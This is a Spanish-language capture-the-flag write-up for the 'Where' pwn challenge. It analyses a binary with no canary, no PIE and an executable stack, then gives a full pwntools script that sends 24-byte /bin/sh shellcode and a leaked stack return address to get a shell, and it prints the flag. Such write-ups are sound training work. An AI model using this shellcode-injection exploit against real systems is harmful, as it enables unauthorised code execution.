# Where

```
checksec --file=where/where/chal
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   41 Symbols	  No	0		2		where/where/chal
```

- El binario no tiene canario, o sea hay buffer overflow seguro en la entrada

- Tiene NX disabled, asi que se puede ejecutar codigo del stack

- No tiene PIE, asi que no necesitamos hallar la direccion base del binario para calcular direcciones de retorno porque estas no cambian.

Nos filtran una direccion del stack 8 bytes antes del inicio de nuestro buffer:
```
[0x7f4e1a4c5b40]> dc
I have put a ramjet on the little einstein's rocket ship
However, I do not know WHERE to go on the next adventure!
Quincy says somewhere around here might be fun... 0x7ffec6979dd8
INFO: hit breakpoint at: 0x40122c
[0x0040122c]> dc
AAAAAAAAAAAAAAA
INFO: hit breakpoint at: 0x401244
[0x0040122c]> pxQ 64@ rsp
0x7ffec6979dd0 0x0000000000000000 section.
0x7ffec6979dd8 0x0000000000000000 section.      # Direccion filtrada
0x7ffec6979de0 0x4141414141414141               # Nuestra entrada: 'AAAAAAAA'
0x7ffec6979de8 0x0a41414141414141               # 'AAAAAAA'
0x7ffec6979df0 0x00007ffec6979e00 rbp
0x7ffec6979df8 0x00007ffec6979e90 rbp+144
0x7ffec6979e00 0x0000000000000001 r8
0x7ffec6979e08 0x00007f4e1a2bbd68
```

La idea es escribir shellcode en el stack, retornar al comienzo de nuestra entrada para ejecutarlo.

El problema es que la entrada es pequeña, 48 bytes - 1 para '\0' que toma fgets:
```
|           0x00401237      be30000000     mov esi, 0x30               ; '0' ; 48
|           0x0040123c      4889c7         mov rdi, rax
|           0x0040123f      e85cfeffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
```

Tenemos solo 47 bytes pero necesitamos inyectar una carga util de:

`shellcode` + `direccion_retorno_en_el_stack` 

Pero los shellcodes para `/bin/cat flag.txt` y `/bin/sh` que trae pwntools son muy grandes (48 y 44 bytes respectivamente), y eso equivale a 48+8=56 y 44+8=52 bytes, es demasiado.

Afortunadamente me encontre este shellcode para `/bin/sh` en shellstorm de solo 24 bytes :)

https://shell-storm.org/shellcode/files/shellcode-909.html

``` python
from pwn import *

elf = context.binary = ELF("./chal")
context.arch='amd64'
#io = process("./chal")
io = remote("where.harkonnen.b01lersc.tf",8443,ssl=True,sni=True)

#gdb.attach(io,gdbscript="""
#           break *main+103
#           """)

# for test return
main = 0x00000000004011dd

# Get address
io.recvuntil(b"Quincy says somewhere around here might be fun... ")
stack_addr = int(io.recvline().strip(),16)
buffer_addr = stack_addr + 0x8

# NX
byteList = [0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x50, 0x54, 0x5f, 0x31, 0xc0, 0x50, 0xb0, 0x3b, 0x54, 0x5a, 0x54, 0x5e, 0x0f, 0x05]
sh = bytes(byteList)
payload = sh.ljust(40,b"\x90") + p64(buffer_addr)
io.sendline(payload)
io.interactive()
```

` bctf(s0_th@ts_wh3r3_Our_ch1ldh00d_w3nt_d06fa4ee84a2e731)`



